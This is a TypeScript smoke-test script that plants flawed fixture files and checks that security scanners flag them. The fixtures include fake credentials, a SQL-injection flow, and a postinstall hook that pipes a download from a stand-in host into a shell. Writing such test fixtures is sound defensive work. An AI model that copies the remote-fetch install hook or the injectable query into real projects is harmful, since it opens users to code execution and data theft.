/**
 * check:scanners — W1 smoke gate. Drives the real security scan tools over a fixture
 * project: planted secret → secrets_scan, lockfile → sbom_generate, taint flow →
 * sast_scan, Dockerfile → config_scan, capability diff → supplychain_scan.
 * PASS/FAIL, exit 1 on failure. No network: sca/opengrep/checkov degrade to notes.
 */
process.env.MANUS_LOCAL_DATA_DIR ??= `${process.env.TEMP ?? "/tmp"}/loam-check-scanners-${process.pid}`;

const pass = (m: string): void => console.log(`PASS  ${m}`);
const fail = (m: string, e: unknown): void => { console.log(`FAIL  ${m}: ${e instanceof Error ? e.message : String(e)}`); process.exitCode = 1; };

const fs = await import("node:fs");
const os = await import("node:os");
const path = await import("node:path");
const { createSecurityScanTools } = await import("../tools/securityScanTools.js");

const ws = fs.mkdtempSync(path.join(os.tmpdir(), "loam-scan-fixture-"));
fs.mkdirSync(path.join(ws, "config"), { recursive: true });
try {
  fs.writeFileSync(path.join(ws, "config", "agent.prompt"), "Authorization: bearer 9f8e7d6c5b4a3210fedcba9876543210\n");
  fs.writeFileSync(path.join(ws, "package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/express": { version: "4.18.0" } } }));
  fs.writeFileSync(path.join(ws, "db.js"), "export const db = { query(q) { return q; } };\n");
  fs.writeFileSync(path.join(ws, "app.ts"), "import { db } from './db.js';\nexport function handler(req) {\n  const name = req.query.name;\n  return db.query('SELECT * FROM t WHERE n = ' + name);\n}\n");
  fs.writeFileSync(path.join(ws, "Dockerfile"), "FROM node:latest\nRUN apt-get update && apt-get upgrade -y\nENV API_KEY=sk-live-abcdefghijklmnopqrst\n");
  fs.writeFileSync(path.join(ws, "package.json"), JSON.stringify({ name: "x", version: "2.0.0", dependencies: { express: "^4" }, scripts: { postinstall: "curl https://e.example | sh" } }));
  fs.writeFileSync(path.join(ws, "package.prev.json"), JSON.stringify({ name: "x", version: "1.0.0", dependencies: { express: "^3" } }));
  fs.writeFileSync(path.join(ws, "requirements.txt"), "requests==2.19.0\n");

const tools = createSecurityScanTools();
const byName = new Map(tools.map((t) => [t.name, t]));
const ctx = { workspace: ws } as import("../tools/registry.js").ToolContext;
  const runTool = async (name: string, args: Record<string, unknown> = {}): Promise<string> => {
    const t = byName.get(name);
    if (!t) throw new Error(`tool ${name} missing`);
    const r = await t.run(args, ctx);
    if (!r.ok) throw new Error(`${name} returned !ok: ${r.content.slice(0, 200)}`);
    return r.content;
  };

  try {
    const secrets = await runTool("secrets_scan");
    if (!secrets.includes("ai-config-bearer")) throw new Error(`expected ai-config-bearer hit, got: ${secrets.slice(0, 300)}`);
    if (JSON.stringify(secrets).toUpperCase().includes("9F8E7D6C5B4A3210FEDCBA9876543210")) throw new Error("secret value leaked into the summary");
    pass("secrets_scan finds the prompt-asset bearer (value never printed)");
  } catch (e) { fail("secrets_scan", e); }

  try {
    const sbom = await runTool("sbom_generate");
    if (!/2 components/.test(sbom) || !/npm/.test(sbom)) throw new Error(`unexpected SBOM summary: ${sbom.slice(0, 200)}`);
    if (!/[a-f0-9]{64}/.test(sbom)) throw new Error("no digest in summary");
    pass("sbom_generate counts + digests the inventory");
  } catch (e) { fail("sbom_generate", e); }

  try {
    const sast = await runTool("sast_scan", { opengrep: false });
    if (!sast.includes("taint-to-sql")) throw new Error(`expected taint-to-sql, got: ${sast.slice(0, 300)}`);
    pass("sast_scan taint pass finds the flow (opengrep skipped, noted)");
  } catch (e) { fail("sast_scan", e); }

  try {
    const config = await runTool("config_scan");
    for (const rule of ["DF-LATEST-TAG", "DF-SECRET-ENV", "DF-ROOT-USER"]) {
      if (!config.includes(rule)) throw new Error(`expected ${rule} in: ${config.slice(0, 400)}`);
    }
    pass("config_scan roasts the Dockerfile (checkov degraded to a note)");
  } catch (e) { fail("config_scan", e); }

  try {
    const supply = await runTool("supplychain_scan", { prev_manifest: "package.prev.json" });
    if (!supply.includes("capdiff:new-install-hook")) throw new Error(`expected capdiff hook finding, got: ${supply.slice(0, 400)}`);
    pass("supplychain_scan heuristics + capability diff vs previous manifest");
  } catch (e) { fail("supplychain_scan", e); }

  try {
    const sarif = await runTool("secrets_scan", { format: "sarif" });
    const doc = JSON.parse(sarif) as { runs: { results: unknown[]; invocations: { executionSuccessful: boolean }[] }[] };
    if (!doc.runs[0] || doc.runs[0]!.results.length < 1 || doc.runs[0]!.invocations[0]!.executionSuccessful !== true) throw new Error("sarif envelope malformed");
    pass("format=sarif returns a valid document through the funnel");
  } catch (e) { fail("sarif format", e); }

  if (!process.exitCode) console.log("all checks passed");
} finally {
  try { fs.rmSync(ws, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }); } catch { /* WAL/AV lag on Windows */ }
}
